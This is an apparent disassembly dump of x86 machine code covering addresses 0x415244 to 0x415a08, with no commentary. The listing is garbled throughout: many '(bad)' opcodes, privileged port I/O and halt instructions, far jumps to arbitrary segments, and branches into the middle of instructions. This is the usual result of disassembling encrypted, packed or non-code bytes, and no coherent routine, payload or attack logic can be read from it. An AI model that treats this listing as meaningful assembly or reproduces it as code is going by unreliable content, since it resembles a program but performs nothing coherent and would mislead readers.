  415244:	test   ecx,eax
  415246:	sbb    bl,dl
  415248:	std    
  415249:	hlt    
  41524a:	inc    edi
  41524b:	rcr    BYTE PTR [edi-0x5e],cl
  41524e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41524f:	test   cl,0x3e
  415252:	ret    
  415253:	in     eax,dx
  415254:	xchg   ebp,eax
  415255:	dec    eax
  415256:	aam    0x6c
  415258:	and    dh,0x86
  41525b:	repz int 0x3d
  41525e:	xor    BYTE PTR [ecx+0x650b34f2],dl
  415264:	inc    edi
  415265:	xchg   DWORD PTR [eax-0x70f0eeaa],ecx
  41526b:	cdq    
  41526c:	dec    edi
  41526d:	pop    esp
  41526e:	jg     0x415282
  415270:	cdq    
  415271:	jbe    0x4152c0
  415273:	mov    ss,WORD PTR [edx-0x26b94d55]
  415279:	out    0x65,al
  41527b:	loopne 0x41522d
  41527d:	in     al,0x84
  41527f:	sub    eax,0x66cad7e
  415284:	(bad)  
  415285:	rcl    DWORD PTR [ebp+ebp*8+0x78a64023],1
  41528c:	pop    edx
  41528d:	xor    edi,DWORD PTR [ecx-0x7d]
  415290:	jmp    0x2cb79190
  415295:	xor    al,dl
  415297:	(bad)  
  415298:	and    al,0x1c
  41529a:	dec    edx
  41529b:	jmp    0x415246
  41529d:	outs   dx,DWORD PTR ds:[esi]
  41529e:	gs loope 0x4152e9
  4152a1:	push   ecx
  4152a2:	or     DWORD PTR [eax],edx
  4152a4:	out    dx,eax
  4152a5:	pop    esi
  4152a6:	nop
  4152a7:	daa    
  4152a8:	xor    DWORD PTR [ebp-0x6ea77749],edi
  4152ae:	dec    edi
  4152af:	lahf   
  4152b0:	aaa    
  4152b1:	lahf   
  4152b2:	mov    ds:0xde260d2c,eax
  4152b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152b8:	pop    edi
  4152b9:	repz sub BYTE PTR [edi+0x13],bh
  4152bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152be:	xchg   ecx,eax
  4152bf:	sti    
  4152c0:	aaa    
  4152c1:	mov    edi,0xbbb6f18b
  4152c6:	dec    ecx
  4152c7:	fild   WORD PTR [edi-0xe]
  4152ca:	cmp    eax,0x215eaec3
  4152cf:	cmp    al,0x14
  4152d1:	popf   
  4152d2:	jge    0x4152f0
  4152d4:	push   ds
  4152d5:	ret    
  4152d6:	adc    DWORD PTR [edx+ebp*8-0x3c8ae9f6],0xff3dfa0d
  4152e1:	out    0xc7,al
  4152e3:	or     al,0xe6
  4152e5:	je     0x4152d2
  4152e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152e8:	out    dx,eax
  4152e9:	dec    esi
  4152ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152eb:	push   esi
  4152ec:	sbb    eax,0x5ae6366f
  4152f1:	fimul  WORD PTR [eax+ecx*1-0x33]
  4152f5:	xchg   edx,eax
  4152f6:	sub    al,0x88
  4152f8:	ret    0x71a1
  4152fb:	mov    edx,ss
  4152fd:	lods   al,BYTE PTR ds:[esi]
  4152fe:	and    cl,dl
  415300:	mov    dl,0xd9
  415302:	pop    es
  415303:	jmp    0x82cb:0xbc5e7214
  41530a:	jno    0x415314
  41530c:	xor    al,BYTE PTR [edi+0x5011131]
  415312:	call   FWORD PTR ss:[ebx-0x44]
  415316:	adc    BYTE PTR [ebx-0x19],ah
  415319:	add    BYTE PTR [edx-0xb],cl
  41531c:	lods   al,BYTE PTR ds:[esi]
  41531d:	lock sbb eax,0x49b37883
  415323:	shl    edi,1
  415325:	jp     0x4152e4
  415327:	repz pushf 
  415329:	lds    ebx,FWORD PTR [eax]
  41532b:	fxch   st(0)
  41532d:	cmp    al,0x8e
  41532f:	frstor [ebp-0x454a5c4]
  415335:	add    ebx,esi
  415337:	inc    edx
  415338:	call   0xa4c17348
  41533d:	mov    dl,0xc5
  41533f:	jbe    0x415335
  415341:	out    dx,al
  415342:	pop    es
  415343:	add    edx,0x5f
  415346:	add    eax,0x7bf1ac2f
  41534b:	ins    BYTE PTR es:[edi],dx
  41534c:	out    dx,al
  41534d:	repnz sbb al,0xbf
  415350:	dec    esi
  415351:	pop    ebp
  415352:	call   0x64491834
  415357:	xor    DWORD PTR [edi],esp
  415359:	(bad)  
  41535a:	sub    eax,0xa0771331
  41535f:	pop    es
  415360:	push   ebx
  415361:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415362:	rol    DWORD PTR [edx-0x6dd7cb27],cl
  415368:	fild   WORD PTR [ebx+0x4d]
  41536b:	mov    WORD PTR [ebp+0x39],ds
  41536e:	dec    edi
  41536f:	fist   DWORD PTR [ebp-0x72a05a5e]
  415375:	sbb    esp,DWORD PTR [ebp-0xff75fa9]
  41537b:	fwait
  41537c:	scas   eax,DWORD PTR es:[edi]
  41537d:	mov    WORD PTR [edi],ss
  41537f:	and    ebp,DWORD PTR [edx]
  415381:	data16 test BYTE PTR [ecx+esi*1+0xb],dh
  415386:	test   al,0x75
  415388:	add    eax,0xbf864be1
  41538d:	mov    dh,0x61
  41538f:	gs fucomp st(3)
  415392:	lock pop ss
  415394:	jno    0x415391
  415396:	and    eax,0x89d4674d
  41539b:	std    
  41539c:	xchg   edi,eax
  41539d:	adc    DWORD PTR [eax+0x47],ecx
  4153a0:	pop    ecx
  4153a1:	leave  
  4153a2:	push   esp
  4153a3:	call   FWORD PTR [edx+0x33beae20]
  4153a9:	jmp    0xf9e3:0x9a0d
  4153af:	or     al,0xd4
  4153b1:	cdq    
  4153b2:	dec    esi
  4153b3:	pop    edi
  4153b4:	bound  eax,QWORD PTR [edi+0x46]
  4153b7:	pop    edi
  4153b8:	retf   
  4153b9:	mov    dl,0x6e
  4153bb:	sbb    dl,BYTE PTR [eax-0x77]
  4153be:	add    al,0x2c
  4153c0:	in     al,0xd5
  4153c2:	lahf   
  4153c3:	outs   dx,BYTE PTR gs:[esi]
  4153c5:	mov    cl,0x4c
  4153c7:	inc    ecx
  4153c8:	aaa    
  4153c9:	dec    edx
  4153ca:	cmp    eax,0x781efbfe
  4153cf:	ins    BYTE PTR es:[edi],dx
  4153d0:	jg     0x415356
  4153d2:	(bad)  
  4153d3:	push   ss
  4153d4:	lds    ecx,FWORD PTR [edi]
  4153d6:	xor    DWORD PTR [edx-0x29],ecx
  4153d9:	sub    DWORD PTR [edi],0xffffffe3
  4153dc:	fnstcw WORD PTR ds:0x2aef9036
  4153e2:	(bad)  
  4153e4:	arpl   dx,sp
  4153e6:	sub    DWORD PTR [ebx],esi
  4153e8:	in     al,dx
  4153e9:	gs iret 
  4153eb:	jae    0x41544a
  4153ed:	scas   eax,DWORD PTR es:[edi]
  4153ee:	sub    ch,BYTE PTR ds:0xbc6a9769
  4153f4:	fwait
  4153f5:	jp     0x4153a0
  4153f7:	lods   eax,DWORD PTR fs:[esi]
  4153f9:	adc    ebx,esp
  4153fb:	in     al,0xf3
  4153fd:	adc    BYTE PTR [edi+0x3cb7d6e1],bl
  415403:	call   0xf35b01c
  415408:	inc    ah
  41540a:	daa    
  41540b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41540c:	ret    0x9b2d
  41540f:	adc    eax,DWORD PTR [edi-0x20b3267e]
  415415:	dec    edx
  415416:	cld    
  415417:	pop    ebx
  415418:	dec    edi
  415419:	inc    esp
  41541a:	and    esp,DWORD PTR [ecx+ebx*1]
  41541d:	and    eax,0x4d0cc581
  415422:	std    
  415423:	push   esi
  415424:	pop    esi
  415425:	test   al,0x64
  415427:	sub    ch,dh
  415429:	loop   0x4153d3
  41542b:	cs cmp al,0x68
  41542e:	or     bl,BYTE PTR [edx+0x35]
  415431:	(bad)  
  415432:	jbe    0x41548d
  415434:	mov    bl,0x5d
  415436:	addr16 sbb al,0x82
  415439:	ins    DWORD PTR es:[edi],dx
  41543a:	ds jns 0x4154ae
  41543d:	imul   edx,DWORD PTR [esi-0x4d2e4ef6],0xffffffa5
  415444:	aas    
  415445:	mov    ch,0xc3
  415447:	inc    edx
  415448:	mov    al,0x54
  41544a:	(bad)  
  41544b:	in     eax,dx
  41544c:	outs   dx,DWORD PTR ds:[esi]
  41544d:	sahf   
  41544e:	jecxz  0x41546c
  415450:	ret    
  415451:	xor    eax,0x87676e00
  415456:	push   0x23
  415458:	jecxz  0x415460
  41545a:	out    dx,al
  41545b:	and    DWORD PTR [ebp-0x1],edi
  41545e:	dec    esp
  41545f:	(bad)  
  415460:	(bad)  
  415461:	clc    
  415462:	int3   
  415463:	loop   0x41546a
  415465:	aas    
  415466:	inc    ecx
  415467:	stos   DWORD PTR es:[edi],eax
  415468:	in     al,0xcc
  41546a:	ficomp WORD PTR [edi-0x26]
  41546d:	sub    BYTE PTR [edx+0x5d],dh
  415470:	mov    al,0xbd
  415472:	ds test bh,bh
  415475:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415476:	adc    BYTE PTR [esi-0x4a95545c],bl
  41547c:	cdq    
  41547d:	popf   
  41547e:	pop    edi
  41547f:	xchg   ecx,eax
  415480:	lods   al,BYTE PTR ds:[esi]
  415481:	inc    edi
  415482:	cdq    
  415483:	(bad)  
  415484:	mov    ebp,0x2213f86
  415489:	mov    ds:0x13cfae1f,al
  41548e:	push   0xaa75f9dc
  415493:	cmc    
  415494:	lahf   
  415495:	mov    dl,0x84
  415497:	mov    dh,0x51
  415499:	stc    
  41549a:	jge    0x415434
  41549c:	fwait
  41549d:	xor    bh,ah
  41549f:	sub    cl,BYTE PTR [eax+0xb]
  4154a2:	imul   ebx,DWORD PTR [esi-0x63],0x59
  4154a6:	jmp    0x4154cd
  4154a8:	arpl   dx,bx
  4154aa:	jecxz  0x415442
  4154ac:	pop    es
  4154ad:	mov    ebp,0x5b5fa506
  4154b2:	pop    ebx
  4154b3:	lds    ecx,FWORD PTR [ebx]
  4154b5:	int3   
  4154b6:	push   eax
  4154b7:	xor    BYTE PTR [edx+eax*4+0x53d3de9d],0xfc
  4154bf:	rcl    BYTE PTR [ecx-0x3a],0xb1
  4154c3:	jle    0x415451
  4154c5:	xor    BYTE PTR [eax+0x36],dl
  4154c8:	mov    ds:0x9bffaa6d,eax
  4154cd:	aad    0x2d
  4154cf:	sbb    esi,ebx
  4154d1:	lods   al,BYTE PTR ds:[esi]
  4154d2:	mov    esp,0x63c53876
  4154d7:	sub    BYTE PTR [esi-0x4b],bh
  4154da:	cwde   
  4154db:	clc    
  4154dc:	sub    ebx,DWORD PTR [eax]
  4154de:	cld    
  4154df:	sbb    DWORD PTR ds:0x77379c22,0x76133865
  4154e9:	int3   
  4154ea:	sbb    edx,DWORD PTR [edi+0x2326f70f]
  4154f0:	iret   
  4154f1:	stc    
  4154f2:	popf   
  4154f3:	mov    esi,0xe0ebf233
  4154f8:	add    BYTE PTR [esi+0x26bdeff2],bh
  4154fe:	fstp   st(5)
  415500:	or     al,0x65
  415502:	mov    bh,0x6c
  415504:	mov    cl,0xee
  415506:	test   BYTE PTR [edi-0x60],0x55
  41550a:	xchg   edx,eax
  41550b:	or     bl,bl
  41550d:	dec    esi
  41550e:	icebp  
  41550f:	jg     0x415493
  415511:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415512:	mov    ebp,0xbad210c8
  415517:	push   ecx
  415518:	bound  edx,QWORD PTR [esp+ecx*4-0x62d8cd7d]
  41551f:	or     esp,DWORD PTR [esi+ebp*4]
  415522:	dec    eax
  415523:	(bad)
  415527:	or     DWORD PTR [edi-0x1d3ab00a],0x13
  41552e:	adc    bh,0x9
  415531:	out    0x4e,al
  415533:	retf   
  415534:	xchg   esp,eax
  415535:	call   0xe601:0x332b3528
  41553c:	push   ebp
  41553d:	loopne 0x41553d
  41553f:	test   DWORD PTR [ebp+0x551f9b77],edx
  415545:	fisub  DWORD PTR ds:0xf4fbbc58
  41554b:	mov    BYTE PTR [edi+0x590d93ca],dl
  415551:	ins    DWORD PTR es:[edi],dx
  415552:	neg    al
  415554:	loopne 0x415501
  415556:	inc    eax
  415557:	dec    ecx
  415558:	(bad)  
  415559:	sbb    ebp,DWORD PTR [edx+0x226e87]
  41555f:	inc    esp
  415560:	fstp   QWORD PTR [eax]
  415562:	cmp    al,0x67
  415564:	in     al,dx
  415565:	lds    esi,FWORD PTR [ecx]
  415567:	test   bh,0x5a
  41556a:	and    eax,0xa3b6fb56
  41556f:	cld    
  415570:	rcr    edi,0xd6
  415573:	pop    es
  415574:	sub    cl,BYTE PTR [eax+0x609d166]
  41557a:	pop    ebx
  41557b:	data16 add al,0xd1
  41557e:	or     bl,al
  415580:	jmp    0x4ac0e7ce
  415585:	or     bh,dh
  415587:	sbb    al,al
  415589:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41558a:	xchg   edi,eax
  41558b:	lock or bl,BYTE PTR [ebp-0x14]
  41558f:	ins    BYTE PTR es:[edi],dx
  415590:	xlat   BYTE PTR ds:[ebx]
  415591:	dec    ebx
  415592:	pop    ds
  415593:	ss jp  0x41556a
  415596:	cmp    bh,BYTE PTR ds:0x43857813
  41559c:	sbb    al,0x3b
  41559e:	mov    cs,WORD PTR [ebx+ebp*4+0x5c5e8f8c]
  4155a5:	imul   edx
  4155a7:	jmp    0x415583
  4155a9:	xchg   BYTE PTR [edx+0x2ba7ad59],dh
  4155af:	pop    ss
  4155b0:	mov    eax,0x618d6aed
  4155b5:	and    eax,0x3d2aae67
  4155ba:	ror    edi,cl
  4155bc:	loope  0x41555e
  4155be:	mov    ?,WORD PTR [esi-0xa]
  4155c1:	xchg   edi,eax
  4155c2:	xchg   ebx,eax
  4155c3:	xchg   esi,eax
  4155c4:	pusha  
  4155c5:	mov    esp,0xb42c54be
  4155ca:	push   0xffffffc6
  4155cc:	inc    eax
  4155cd:	das    
  4155ce:	dec    ebx
  4155cf:	jne    0x4155ad
  4155d1:	mov    ds:0xe6bbda45,al
  4155d6:	test   al,0x32
  4155d8:	test   BYTE PTR [esi-0x26],al
  4155db:	xchg   ecx,eax
  4155dc:	fwait
  4155dd:	pop    ss
  4155de:	inc    ecx
  4155df:	dec    ebx
  4155e0:	int3   
  4155e1:	int3   
  4155e2:	scas   al,BYTE PTR es:[edi]
  4155e3:	mov    WORD PTR [edx],ds
  4155e5:	lock add eax,DWORD PTR [ecx+0x1d64f60c]
  4155ec:	xchg   edi,eax
  4155ed:	jmp    0x4155a4
  4155ef:	inc    edx
  4155f0:	dec    esp
  4155f1:	call   0x548240c1
  4155f6:	rcr    edi,0xb9
  4155f9:	popa   
  4155fa:	mov    BYTE PTR [eax-0x22],al
  4155fd:	push   esp
  4155fe:	cwde   
  4155ff:	pop    ebp
  415600:	imul   ebp,edi,0x3e
  415603:	push   ds
  415604:	xor    eax,0x78827312
  415609:	mov    DWORD PTR [edx-0xcee3634],eax
  41560f:	ins    BYTE PTR es:[edi],dx
  415610:	jmp    0x41563f
  415612:	rol    DWORD PTR [ecx+0x72],cl
  415615:	push   ds
  415616:	(bad)  
  415617:	mov    al,0xc5
  415619:	loopne 0x415609
  41561b:	retf   
  41561c:	smsw   WORD PTR [ebx+0x5a]
  415620:	xor    al,0x53
  415622:	frstor [edx-0x68a6d858]
  415628:	(bad)  [edi+0x6e]
  41562b:	ficom  WORD PTR [edx]
  41562d:	shl    DWORD PTR [edx+0x200a75f7],1
  415633:	adc    al,0x7f
  415635:	icebp  
  415636:	test   al,0x8d
  415638:	pop    eax
  415639:	jmp    0x1bd268e4
  41563e:	ret    0x8a41
  415641:	push   ebx
  415642:	jb     0x41560f
  415644:	iret   
  415645:	retf   
  415646:	or     DWORD PTR [eax],0x3
  415649:	aad    0x9f
  41564b:	mov    bl,0x4e
  41564d:	js     0x415636
  41564f:	lods   eax,DWORD PTR ds:[esi]
  415650:	add    BYTE PTR [esi+0x760b03ba],al
  415656:	inc    esp
  415657:	test   DWORD PTR [ebp+0xd6e6b5],esp
  41565d:	fild   QWORD PTR [edi+0x493b7dc]
  415663:	add    DWORD PTR [eax],edi
  415665:	xor    eax,0xa9b9b4ae
  41566a:	pusha  
  41566b:	mov    DWORD PTR [edi-0x27],0x59f2d1ca
  415672:	test   DWORD PTR [edi],0x71bb4728
  415678:	cmp    al,ah
  41567a:	sub    al,ah
  41567c:	pop    edx
  41567d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41567e:	fbld   TBYTE PTR [edx]
  415680:	in     al,dx
  415681:	mov    DWORD PTR [eax-0x42],edi
  415684:	test   BYTE PTR [edx+0x5d],bh
  415687:	dec    ebp
  415688:	push   esp
  415689:	adc    edx,0x20bdde25
  41568f:	in     eax,0xb4
  415691:	je     0x415625
  415693:	call   0xa706:0x68a5dd
  41569a:	xor    eax,0xc83fdd89
  41569f:	push   ss
  4156a0:	popf   
  4156a1:	jecxz  0x4156e8
  4156a3:	repz test al,0xa7
  4156a6:	arpl   WORD PTR [edi+eiz*1],cx
  4156a9:	jg     0x415652
  4156ab:	pop    esp
  4156ac:	dec    ecx
  4156ad:	repnz out 0x85,al
  4156b0:	mov    BYTE PTR [edx],dh
  4156b2:	add    esi,ebp
  4156b4:	ret    
  4156b5:	add    eax,0xe470ecbf
  4156ba:	mov    dh,0xc8
  4156bc:	ds xchg edi,eax
  4156be:	outs   dx,BYTE PTR ds:[esi]
  4156bf:	or     al,0xd1
  4156c1:	inc    al
  4156c3:	call   0x712d6e6b
  4156c8:	push   ecx
  4156c9:	fsub   DWORD PTR [edi+ecx*8]
  4156cc:	adc    al,BYTE PTR [ecx-0x5fee4e9f]
  4156d2:	push   esi
  4156d3:	call   0x724d:0xdb912e28
  4156da:	sub    al,0x1b
  4156dc:	add    esi,DWORD PTR [ebx-0x44]
  4156df:	sub    esi,DWORD PTR ds:0x91a0a652
  4156e5:	mov    ebx,0x48b2d345
  4156ea:	stc    
  4156eb:	ret    
  4156ec:	mov    ecx,DWORD PTR [eax-0x78e7c67e]
  4156f2:	(bad)  
  4156f3:	rcr    bh,1
  4156f5:	retf   
  4156f6:	xor    ebx,DWORD PTR [ecx]
  4156f8:	jo     0x41568c
  4156fa:	outs   dx,DWORD PTR ds:[esi]
  4156fb:	div    BYTE PTR [edi-0x3a6eebab]
  415701:	add    eax,0x9a1b9009
  415706:	mov    esp,0x44fc6172
  41570b:	test   eax,0xc6aa26dd
  415710:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415711:	test   esp,0xb3d88b13
  415717:	cmp    ah,BYTE PTR [esi+0x756c4adc]
  41571d:	cmp    eax,0x7b68daa
  415722:	enter  0x1190,0x72
  415726:	jmp    0x2afd:0x87f77455
  41572d:	in     eax,0x89
  41572f:	dec    esi
  415730:	ror    DWORD PTR [edi+0x3f],0x87
  415734:	call   0x3b7:0x753bec92
  41573b:	(bad)  
  41573d:	push   0x79
  41573f:	daa    
  415740:	fldcw  WORD PTR [ebp+0x58ccd599]
  415746:	fst    DWORD PTR [ebx+esi*1-0x5e]
  41574a:	ret    
  41574b:	mov    edx,0x34150dac
  415750:	leave  
  415751:	jmp    0x41574c
  415753:	cwde   
  415754:	inc    eax
  415755:	cwde   
  415756:	mov    WORD PTR [eax+eax*4],ss
  415759:	mov    ch,0xa1
  41575b:	jne    0x4156f1
  41575d:	xchg   esi,eax
  41575e:	fcom   QWORD PTR [edi-0x31]
  415761:	aad    0x27
  415763:	repz fcomp DWORD PTR [edx+eax*2]
  415767:	add    al,ah
  415769:	ret    
  41576a:	push   ecx
  41576b:	(bad)  
  41576c:	inc    eax
  41576d:	in     al,dx
  41576e:	fxch   st(7)
  415770:	scas   eax,DWORD PTR es:[edi]
  415771:	cmc    
  415772:	dec    esp
  415773:	mov    esp,0xee8bef1e
  415778:	stos   DWORD PTR es:[edi],eax
  415779:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41577a:	repnz xlat BYTE PTR ds:[ebx]
  41577c:	js     0x4157df
  41577e:	adc    al,0x58
  415780:	pop    esp
  415781:	sbb    ch,0x3d
  415784:	pop    ebx
  415785:	mov    ds:0xed1e46f2,al
  41578a:	cwde   
  41578b:	mov    edi,0x47ecc0db
  415790:	in     eax,0x69
  415792:	pop    edx
  415793:	data16 jb 0x415784
  415796:	jns    0x415752
  415798:	imul   BYTE PTR [ebx+ecx*8-0x56]
  41579c:	les    esp,FWORD PTR [ebx-0x51]
  41579f:	sahf   
  4157a0:	push   esp
  4157a1:	or     esp,DWORD PTR [eax]
  4157a3:	loope  0x4157b6
  4157a5:	or     dh,BYTE PTR [edx-0xbd63af0]
  4157ab:	inc    esi
  4157ac:	loope  0x415775
  4157ae:	mov    esp,0x1e8a02d8
  4157b3:	lods   al,BYTE PTR ds:[esi]
  4157b4:	aas    
  4157b5:	push   ecx
  4157b6:	retf   
  4157b7:	dec    esp
  4157b8:	(bad)  
  4157b9:	sub    al,0x60
  4157bb:	aad    0x54
  4157bd:	stos   DWORD PTR es:[edi],eax
  4157be:	lods   eax,DWORD PTR ds:[esi]
  4157bf:	jmp    0xfdc431f8
  4157c4:	xchg   esp,eax
  4157c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157c6:	nop
  4157c7:	or     bl,BYTE PTR [ebx-0x54]
  4157ca:	stc    
  4157cb:	mov    DWORD PTR [ebx-0x73],ecx
  4157ce:	scas   al,BYTE PTR es:[edi]
  4157cf:	cs push ecx
  4157d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157d2:	cmp    al,0x1f
  4157d4:	xchg   ebx,eax
  4157d5:	xchg   edx,eax
  4157d6:	fwait
  4157d7:	pop    esi
  4157d8:	repnz xchg ebx,eax
  4157da:	sub    BYTE PTR [ecx-0x204a153],0x67
  4157e1:	sti    
  4157e2:	cmp    DWORD PTR [esi],edi
  4157e4:	xchg   ebp,eax
  4157e5:	shl    DWORD PTR [ebp-0x35],1
  4157e8:	dec    ebp
  4157e9:	dec    edx
  4157ea:	(bad)  
  4157eb:	mov    ds:0xd21ffaa6,eax
  4157f0:	sub    DWORD PTR [esi],esp
  4157f2:	mov    dh,0xf6
  4157f4:	dec    ecx
  4157f5:	lock sar DWORD PTR [ecx+0x78],cl
  4157f9:	out    dx,eax
  4157fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157fb:	add    BYTE PTR ds:0x278077a3,dh
  415801:	dec    eax
  415802:	cli    
  415803:	mov    esi,0xc5220646
  415808:	push   eax
  415809:	sbb    eax,0x88709904
  41580e:	push   ds
  41580f:	popa   
  415810:	test   eax,0x4165973e
  415815:	inc    esp
  415816:	or     dh,al
  415818:	test   al,0xc3
  41581a:	sbb    BYTE PTR [eax],bl
  41581c:	jb     0x415802
  41581e:	lods   eax,DWORD PTR ds:[esi]
  41581f:	jp     0x415876
  415821:	ret    
  415822:	push   ss
  415823:	(bad)  
  415824:	and    ecx,DWORD PTR [edi]
  415826:	inc    eax
  415827:	push   0xffffffbc
  415829:	dec    eax
  41582a:	lods   eax,DWORD PTR ds:[esi]
  41582b:	or     ch,al
  41582d:	push   esp
  41582e:	jb     0x4157f5
  415830:	xor    eax,0x93e243df
  415835:	add    al,0xf5
  415837:	push   ebp
  415838:	hlt    
  415839:	sub    bl,BYTE PTR [edi+0x399fbf08]
  41583f:	cdq    
  415840:	fild   WORD PTR [ebx]
  415842:	push   ebx
  415843:	ret    
  415844:	frndint 
  415846:	rol    DWORD PTR [ebp+0xdb1298f],1
  41584c:	jbe    0x415831
  41584e:	fld    DWORD PTR [esi-0x47]
  415851:	clc    
  415852:	out    dx,eax
  415853:	sub    DWORD PTR [edi],0xe02d8476
  415859:	int    0x2a
  41585b:	mov    ebp,0x6566f014
  415860:	push   esi
  415861:	outs   dx,DWORD PTR ds:[esi]
  415862:	adc    ebx,DWORD PTR [ebx+ebx*1+0x622a0e50]
  415869:	pop    es
  41586a:	mov    eax,0xa993c199
  41586f:	(bad)  
  415870:	aas    
  415871:	(bad)  
  415872:	xor    al,0x6d
  415874:	dec    edi
  415875:	sbb    dl,dl
  415877:	out    dx,al
  415878:	and    al,0x29
  41587a:	test   eax,0xaafc28b3
  41587f:	cdq    
  415880:	push   0xffffffad
  415882:	pop    ecx
  415883:	hlt    
  415884:	and    BYTE PTR [eax-0x9762a9f],dl
  41588a:	cli    
  41588b:	ins    BYTE PTR es:[edi],dx
  41588c:	jl     0x4158d7
  41588e:	add    ah,BYTE PTR [esi-0x18bdaf6f]
  415894:	mov    ds:0x52db790a,al
  415899:	std    
  41589a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41589b:	inc    bh
  41589d:	arpl   WORD PTR [esi-0x3dd88910],dx
  4158a3:	cli    
  4158a4:	shl    DWORD PTR [edi+0x122ee0e8],1
  4158aa:	sti    
  4158ab:	daa    
  4158ac:	cli    
  4158ad:	jae    0x4158ce
  4158af:	push   ds
  4158b0:	mov    ds:0xbb26dc16,eax
  4158b5:	(bad)  
  4158b6:	(bad)  
  4158b7:	lods   eax,DWORD PTR ds:[esi]
  4158b9:	xchg   esp,eax
  4158ba:	sbb    bh,BYTE PTR [ebx+ecx*4-0x47]
  4158be:	lods   eax,DWORD PTR ds:[esi]
  4158bf:	(bad)  
  4158c1:	iret   
  4158c2:	pop    edi
  4158c3:	xchg   BYTE PTR [eax-0x2a],ch
  4158c6:	adc    BYTE PTR [ecx-0x8],dl
  4158c9:	sbb    cl,BYTE PTR [ebx+0x33449f5c]
  4158cf:	sti    
  4158d0:	xor    al,0x13
  4158d2:	outs   dx,BYTE PTR ds:[esi]
  4158d3:	fdivr  DWORD PTR [ebp-0x2a]
  4158d6:	jne    0x415952
  4158d8:	jnp    0x4158d0
  4158da:	movsx  ebp,BYTE PTR [esi+0x2967f94]
  4158e1:	mov    WORD PTR [edx-0x7c429d9d],es
  4158e7:	cmp    BYTE PTR [edi],cl
  4158e9:	ja     0x415901
  4158eb:	and    eax,0xd0197485
  4158f0:	out    0xf1,al
  4158f2:	sbb    bh,BYTE PTR [eax+0x14]
  4158f5:	ret    0x46c9
  4158f8:	inc    esi
  4158f9:	mov    ?,WORD PTR [esi]
  4158fb:	into   
  4158fc:	push   esp
  4158fd:	pop    ebx
  4158fe:	jmp    0xc48a:0xb2ad07e7
  415905:	cmp    eax,0xc66ac878
  41590a:	mov    ds:0xe5e7949d,eax
  41590f:	mov    esp,0x9146e673
  415914:	xor    esi,edx
  415916:	mov    esp,0x8b4d237b
  41591b:	ret    
  41591c:	mov    esp,0xe1dcacbf
  415921:	jmp    0x41596e
  415923:	or     eax,0x19a167e8
  415929:	jnp    0x41593e
  41592b:	fcomi  st,st(1)
  41592d:	out    dx,eax
  41592e:	and    DWORD PTR [eax+0x5d51725f],esi
  415934:	fs popa 
  415936:	mov    cl,0x4d
  415938:	jno    0x41592a
  41593a:	or     al,0xe6
  41593c:	add    ecx,DWORD PTR [ebx]
  41593e:	jmp    0x23b1:0x7ec24277
  415945:	inc    esi
  415946:	rsqrtps xmm4,xmm1
  415949:	shl    DWORD PTR [ecx],1
  41594b:	stos   DWORD PTR es:[edi],eax
  41594c:	sar    DWORD PTR [eax],0xb
  41594f:	push   esp
  415950:	push   ebp
  415951:	jmp    esp
  415953:	out    0x56,al
  415955:	pop    esi
  415956:	imul   edi,DWORD PTR [edx+esi*1+0x5160aab2],0xceada9be
  415961:	xchg   DWORD PTR [ebp+0x6bb89ea1],ebx
  415967:	mov    bh,0xaf
  415969:	sub    bh,BYTE PTR [esi]
  41596b:	(bad)  
  41596c:	push   ecx
  41596e:	test   eax,0x97a38480
  415973:	mov    esi,0xa83c1688
  415978:	jl     0x415939
  41597a:	mov    esp,0x1f8c235e
  41597f:	sbb    edi,ecx
  415981:	jecxz  0x4159b3
  415983:	push   eax
  415984:	imul   esi,DWORD PTR [ecx+0x186bba9c],0x1c
  41598b:	inc    edi
  41598c:	scas   al,BYTE PTR es:[edi]
  41598d:	sar    al,1
  41598f:	xor    esi,eax
  415991:	lods   al,BYTE PTR ds:[esi]
  415992:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415993:	hlt    
  415994:	xchg   esi,ebx
  415996:	mov    ah,0x57
  415998:	sbb    eax,0xe209daa9
  41599d:	(bad)  
  41599e:	push   edi
  41599f:	add    eax,0x3488dfee
  4159a4:	xchg   DWORD PTR [esi],esp
  4159a6:	sbb    eax,0x770c59b5
  4159ab:	pop    edi
  4159ac:	add    esi,edi
  4159ae:	jmp    0x4159d7
  4159b0:	retf   
  4159b1:	pop    edx
  4159b2:	fiadd  WORD PTR [edx+ebx*1-0x6f]
  4159b6:	mov    esi,0x22192ca9
  4159bb:	(bad)
  4159be:	imul   edx,ebx,0xeb01af79
  4159c4:	fxtract 
  4159c6:	iret   
  4159c7:	push   edi
  4159c8:	xchg   cx,ax
  4159ca:	stos   DWORD PTR es:[edi],eax
  4159cb:	push   0x8
  4159cd:	lea    edx,[edx+0x52]
  4159d0:	in     eax,dx
  4159d1:	mov    ds:0x16816f01,eax
  4159d6:	inc    edi
  4159d7:	pop    edi
  4159d8:	aad    0x39
  4159da:	xor    DWORD PTR [ebx-0x178efd20],ecx
  4159e0:	test   al,0x95
  4159e2:	cmp    cl,BYTE PTR [edi+eiz*1-0x5e85463]
  4159e9:	sti    
  4159ea:	ds mov ch,0x28
  4159ed:	test   al,0xac
  4159ef:	adc    al,0x60
  4159f1:	lods   al,BYTE PTR ds:[esi]
  4159f2:	test   edx,esi
  4159f4:	sbb    DWORD PTR [edi-0x36],esi
  4159f7:	inc    edx
  4159f8:	sbb    al,0x41
  4159fa:	outs   dx,DWORD PTR ds:[esi]
  4159fb:	loop   0x41599e
  4159fd:	xchg   DWORD PTR [eax+0x3b64d0f6],ebp
  415a03:	jae    0x415a31
  415a05:	retf   0xaf39
  415a08:	sub    BYTE PTR [ebx],bl
